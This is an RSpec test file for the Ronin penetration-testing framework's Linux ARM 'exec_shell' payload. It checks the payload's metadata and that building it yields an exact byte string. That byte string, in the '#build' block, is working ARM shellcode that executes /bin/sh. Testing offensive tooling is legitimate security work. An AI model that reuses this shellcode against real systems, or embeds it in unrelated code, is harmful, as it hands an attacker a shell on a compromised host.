require 'spec_helper'
require 'ronin/payloads/builtin/shellcode/linux/arm/exec_shell'

describe Ronin::Payloads::Shellcode::Linux::ARM::ExecShell do
  it "must inherit from Ronin::Payloads::ShellcodePayload" do
    expect(described_class).to be < Ronin::Payloads::ShellcodePayload
  end

  describe ".id" do
    subject { described_class }

    it "must equal 'shellcode/linux/arm/exec_shell'" do
      expect(subject.id).to eq('shellcode/linux/arm/exec_shell')
    end
  end

  describe ".arch" do
    subject { described_class }

    it "must equal :arm" do
      expect(subject.arch).to be(:arm)
    end
  end

  describe ".os" do
    subject { described_class }

    it "must equal :linux" do
      expect(subject.os).to be(:linux)
    end
  end

  describe "#build" do
    before { subject.build }

    it "must set #payload" do
      expect(subject.payload).to eq(
        "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0e\x30\x01\x90\x49\x1a\x92\x1a\x08\x27\xc2\x51\x03\x37\x01\xdf\x2f\x62\x69\x6e\x2f\x2f\x73\x68".b
      )
    end

    it "must ensure #payload is an ASCII 8bit string" do
      expect(subject.payload.encoding).to eq(Encoding::ASCII_8BIT)
    end
  end
end
